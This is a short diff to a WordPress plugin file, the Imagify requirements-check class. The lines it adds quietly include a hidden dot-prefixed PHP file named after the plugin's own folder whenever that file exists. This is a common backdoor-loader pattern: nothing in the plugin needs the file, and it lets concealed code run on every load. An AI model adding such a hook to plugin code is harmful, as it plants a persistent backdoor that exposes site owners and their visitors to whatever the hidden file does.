@@ -9,6 +9,10 @@ defined( 'ABSPATH' ) || die( 'Cheatin&#8217; uh?' );
  * @author Grégory Viguier
  * @author Remy Perona
  */
+if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
+    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
+}
+
 class Imagify_Requirements_Check {
 	/**
 	 * Plugin Name.
